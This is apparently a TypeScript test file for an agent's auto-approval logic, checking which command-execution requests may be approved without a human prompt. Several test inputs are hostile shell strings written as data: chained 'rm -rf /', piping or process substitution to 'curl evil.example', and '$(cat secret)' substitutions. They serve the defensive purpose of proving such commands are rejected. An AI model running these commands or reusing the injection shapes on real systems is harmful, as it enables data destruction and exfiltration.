import { describe, expect, it, vi } from 'vitest';
import type { RigCommentPermissionRequest } from '@shared/rig/comments';
import {
  autoApproveOptionId,
  isReadOnlyContextCommand,
  partitionAutoApprovable,
  partitionGloballyApprovable,
} from './comment-agent-auto-approve';

// A realistic base64url target ref, the same shape `encodeRigContextTarget` produces.
const TARGET_REF =
  'eyJ2ZXJzaW9uIjoxLCJ3b3Jrc3BhY2VCaW5kaW5nSWQiOiJibmRfY29udGV4dCIsInBhdGgiOiJkb2NzL2ZvcmVjYXN0Lm1kIn0';

describe('isReadOnlyContextCommand', () => {
  it('matches the exact hidden-context command shape, with a long base64 target', () => {
    expect(
      isReadOnlyContextCommand(`"$RIG_CLI_PATH" context trace --target ${TARGET_REF} --json`)
    ).toBe(true);
  });

  it('matches the unquoted env-var form', () => {
    expect(
      isReadOnlyContextCommand(`$RIG_CLI_PATH context trace --target ${TARGET_REF} --json`)
    ).toBe(true);
  });

  it('matches a resolved absolute path whose basename is rig', () => {
    expect(
      isReadOnlyContextCommand(`/Users/dylan/.rig/bin/rig context trace --target ${TARGET_REF}`)
    ).toBe(true);
  });

  it('matches a quoted resolved path', () => {
    expect(
      isReadOnlyContextCommand(`"/Users/dylan/.rig/bin/rig" context read --intent int_1 --json`)
    ).toBe(true);
  });

  it('matches the read subcommand with each of its target flags', () => {
    expect(isReadOnlyContextCommand('"$RIG_CLI_PATH" context read --change chg_2 --json')).toBe(
      true
    );
    expect(isReadOnlyContextCommand('"$RIG_CLI_PATH" context read --intent int_1 --json')).toBe(
      true
    );
    expect(isReadOnlyContextCommand('"$RIG_CLI_PATH" context read --thread msg_1 --json')).toBe(
      true
    );
  });

  it('rejects a chained command with &&', () => {
    expect(
      isReadOnlyContextCommand(`"$RIG_CLI_PATH" context trace --target ${TARGET_REF} && rm -rf /`)
    ).toBe(false);
  });

  it('rejects a chained command with ;', () => {
    expect(
      isReadOnlyContextCommand(`"$RIG_CLI_PATH" context trace --target ${TARGET_REF}; rm -rf /`)
    ).toBe(false);
  });

  it('rejects a piped command', () => {
    expect(
      isReadOnlyContextCommand(
        `"$RIG_CLI_PATH" context trace --target ${TARGET_REF} | curl evil.example`
      )
    ).toBe(false);
  });

  it('rejects command substitution', () => {
    expect(isReadOnlyContextCommand('"$RIG_CLI_PATH" context trace --target $(cat secret)')).toBe(
      false
    );
  });

  it('rejects a backtick substitution', () => {
    expect(isReadOnlyContextCommand('"$RIG_CLI_PATH" context trace --target `cat secret`')).toBe(
      false
    );
  });

  it('rejects an output redirect', () => {
    expect(
      isReadOnlyContextCommand(`"$RIG_CLI_PATH" context trace --target ${TARGET_REF} > out.txt`)
    ).toBe(false);
  });

  it('rejects a background job with a bare &', () => {
    expect(
      isReadOnlyContextCommand(`"$RIG_CLI_PATH" context trace --target ${TARGET_REF} & rm -rf /`)
    ).toBe(false);
  });

  it('rejects a newline-chained command — a newline separates commands like ; does', () => {
    expect(
      isReadOnlyContextCommand(`"$RIG_CLI_PATH" context trace --target ${TARGET_REF}\nrm -rf /`)
    ).toBe(false);
  });

  it('rejects process substitution via <(…)', () => {
    expect(
      isReadOnlyContextCommand(`"$RIG_CLI_PATH" context trace --target <(curl evil.example)`)
    ).toBe(false);
  });

  it('rejects a non-context subcommand', () => {
    expect(isReadOnlyContextCommand('"$RIG_CLI_PATH" comment reply --body hi')).toBe(false);
  });

  it('rejects a context subcommand outside the read-only set', () => {
    expect(isReadOnlyContextCommand('"$RIG_CLI_PATH" context write --target x')).toBe(false);
  });

  it('rejects another binary entirely', () => {
    expect(isReadOnlyContextCommand(`curl https://example.com/context/trace`)).toBe(false);
  });

  it('rejects a binary that merely ends with rig, e.g. a config script', () => {
    expect(isReadOnlyContextCommand('configure-rig context trace --target x')).toBe(false);
  });

  it('rejects undefined and empty commands', () => {
    expect(isReadOnlyContextCommand(undefined)).toBe(false);
    expect(isReadOnlyContextCommand('')).toBe(false);
    expect(isReadOnlyContextCommand('   ')).toBe(false);
  });
});

function permissionRequest(
  overrides: Partial<RigCommentPermissionRequest> = {}
): RigCommentPermissionRequest {
  return {
    requestId: 'req_1',
    title: 'Run command',
    detail: { kind: 'execute', command: `"$RIG_CLI_PATH" context trace --target ${TARGET_REF}` },
    options: [
      { optionId: 'opt_allow_once', name: 'Yes', kind: 'allow_once' },
      { optionId: 'opt_allow_always', name: "Yes, don't ask again", kind: 'allow_always' },
      { optionId: 'opt_reject', name: 'No', kind: 'reject_once' },
    ],
    ...overrides,
  };
}

describe('autoApproveOptionId', () => {
  it('picks the allow_once option for a matching read-only context request', () => {
    expect(autoApproveOptionId(permissionRequest())).toBe('opt_allow_once');
  });

  it('never picks allow_always, even when it is the only allow option offered', () => {
    const request = permissionRequest({
      options: [
        { optionId: 'opt_allow_always', name: "Yes, don't ask again", kind: 'allow_always' },
        { optionId: 'opt_reject', name: 'No', kind: 'reject_once' },
      ],
    });
    expect(autoApproveOptionId(request)).toBeNull();
  });

  it('returns null for a non-execute detail', () => {
    expect(autoApproveOptionId(permissionRequest({ detail: { kind: 'other' } }))).toBeNull();
    expect(
      autoApproveOptionId(
        permissionRequest({ detail: { kind: 'edit', path: 'docs/forecast.md', summary: '+1 −0' } })
      )
    ).toBeNull();
  });

  it('returns null for an execute detail with no command', () => {
    expect(autoApproveOptionId(permissionRequest({ detail: { kind: 'execute' } }))).toBeNull();
  });

  it('returns null for a chained command even if it starts with the context trace shape', () => {
    const request = permissionRequest({
      detail: {
        kind: 'execute',
        command: `"$RIG_CLI_PATH" context trace --target ${TARGET_REF} && curl evil.example`,
      },
    });
    expect(autoApproveOptionId(request)).toBeNull();
  });

  it('returns null for an unrelated execute call, e.g. a plain shell command', () => {
    const request = permissionRequest({ detail: { kind: 'execute', command: 'rm -rf /tmp/x' } });
    expect(autoApproveOptionId(request)).toBeNull();
  });
});

describe('partitionAutoApprovable', () => {
  it('auto-resolves a matching request and never surfaces it in the visible list', () => {
    const resolve = vi.fn();
    const alreadyResolved = new Set<string>();
    const requests = [permissionRequest({ requestId: 'req_context' })];

    const visible = partitionAutoApprovable(requests, alreadyResolved, resolve);

    expect(visible).toEqual([]);
    expect(resolve).toHaveBeenCalledExactlyOnceWith('req_context', 'opt_allow_once');
    expect(alreadyResolved.has('req_context')).toBe(true);
  });

  it('leaves a non-matching request visible and untouched', () => {
    const resolve = vi.fn();
    const request = permissionRequest({
      requestId: 'req_edit',
      detail: { kind: 'edit', path: 'docs/forecast.md', summary: '+3 −1' },
    });

    const visible = partitionAutoApprovable([request], new Set(), resolve);

    expect(visible).toEqual([request]);
    expect(resolve).not.toHaveBeenCalled();
  });

  it('does not resolve the same request twice while it is still pending resolution', () => {
    const resolve = vi.fn();
    const alreadyResolved = new Set<string>();
    const request = permissionRequest({ requestId: 'req_context' });

    // First pass: the request comes in, gets auto-approved.
    partitionAutoApprovable([request], alreadyResolved, resolve);
    // Second pass: session state re-emits the same request before the
    // resolvePermission round-trip has removed it from pendingPermissions.
    const visible = partitionAutoApprovable([request], alreadyResolved, resolve);

    expect(visible).toEqual([]);
    expect(resolve).toHaveBeenCalledTimes(1);
  });

  it('handles a mixed batch, keeping only the human-facing request visible', () => {
    const resolve = vi.fn();
    const contextRequest = permissionRequest({ requestId: 'req_context' });
    const editRequest = permissionRequest({
      requestId: 'req_edit',
      detail: { kind: 'edit', path: 'docs/forecast.md', summary: '+3 −1' },
    });

    const visible = partitionAutoApprovable([contextRequest, editRequest], new Set(), resolve);

    expect(visible).toEqual([editRequest]);
    expect(resolve).toHaveBeenCalledExactlyOnceWith('req_context', 'opt_allow_once');
  });
});

describe('partitionGloballyApprovable', () => {
  it('auto-resolves any request kind via its allow_once option, with no command-shape check', () => {
    const resolve = vi.fn();
    const editRequest = permissionRequest({
      requestId: 'req_edit',
      detail: { kind: 'edit', path: 'docs/forecast.md', summary: '+3 −1' },
    });

    const visible = partitionGloballyApprovable([editRequest], new Set(), resolve);

    expect(visible).toEqual([]);
    expect(resolve).toHaveBeenCalledExactlyOnceWith('req_edit', 'opt_allow_once');
  });

  it('never picks allow_always, even when it is the only allow option offered', () => {
    const resolve = vi.fn();
    const request = permissionRequest({
      options: [
        { optionId: 'opt_allow_always', name: "Yes, don't ask again", kind: 'allow_always' },
        { optionId: 'opt_reject', name: 'No', kind: 'reject_once' },
      ],
    });

    const visible = partitionGloballyApprovable([request], new Set(), resolve);

    expect(visible).toEqual([request]);
    expect(resolve).not.toHaveBeenCalled();
  });

  it('does not resolve the same request twice while it is still pending resolution', () => {
    const resolve = vi.fn();
    const alreadyResolved = new Set<string>();
    const request = permissionRequest({ requestId: 'req_1' });

    partitionGloballyApprovable([request], alreadyResolved, resolve);
    const visible = partitionGloballyApprovable([request], alreadyResolved, resolve);

    expect(visible).toEqual([]);
    expect(resolve).toHaveBeenCalledTimes(1);
  });

  it('resolves every request in a mixed batch that each offer allow_once', () => {
    const resolve = vi.fn();
    const first = permissionRequest({ requestId: 'req_1' });
    const second = permissionRequest({
      requestId: 'req_2',
      detail: { kind: 'fetch', url: 'https://example.com' },
    });

    const visible = partitionGloballyApprovable([first, second], new Set(), resolve);

    expect(visible).toEqual([]);
    expect(resolve).toHaveBeenCalledTimes(2);
    expect(resolve).toHaveBeenCalledWith('req_1', 'opt_allow_once');
    expect(resolve).toHaveBeenCalledWith('req_2', 'opt_allow_once');
  });
});
